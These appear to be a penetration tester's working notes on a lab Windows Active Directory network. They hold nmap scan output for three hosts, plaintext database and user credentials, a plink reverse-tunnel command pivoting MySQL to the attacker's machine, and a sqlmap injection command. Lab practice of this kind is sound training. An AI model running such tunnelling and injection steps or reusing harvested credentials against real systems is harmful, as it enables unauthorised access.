192.168.141.97	VM 1
	sudo nmap -sV 192.168.141.97 --top-ports 100
	PORT    STATE SERVICE      VERSION
	53/tcp  open  domain       Simple DNS Plus
	88/tcp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-04-23 19:28:56Z)
	135/tcp open  msrpc        Microsoft Windows RPC
	139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
	389/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: secura.yzx, Site: Default-First-Site-Name)
	445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: SECURA)
	Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
192.168.141.96	VM 2
	sudo nmap -sV 192.168.141.96 --top-ports 100
	PORT     STATE SERVICE       VERSION
	135/tcp  open  msrpc         Microsoft Windows RPC
	139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp  open  microsoft-ds?
	3306/tcp open  mysql         MariaDB 10.3.24 or later (unauthorized)
	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
	root eK6q1CJ9697s7O 
192.168.141.95	VM 3
	Eric.Wallows / EricLikesRunning800
	rdp -> user is logged in
	http://192.168.141.95:44444/index.do -> ManageEngine App Manager
	sudo nmap -sV 192.168.141.95 --top-ports 100
	PORT     STATE SERVICE       VERSION
	135/tcp  open  msrpc         Microsoft Windows RPC
	139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp  open  microsoft-ds?
	3389/tcp open  ms-wbt-server Microsoft Terminal Services
	8443/tcp open  ssl/https-alt AppManager


plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3306 192.168.45.219
sqlmap -u http://192.168.141.96/blindsqli.php?user=1 -p user
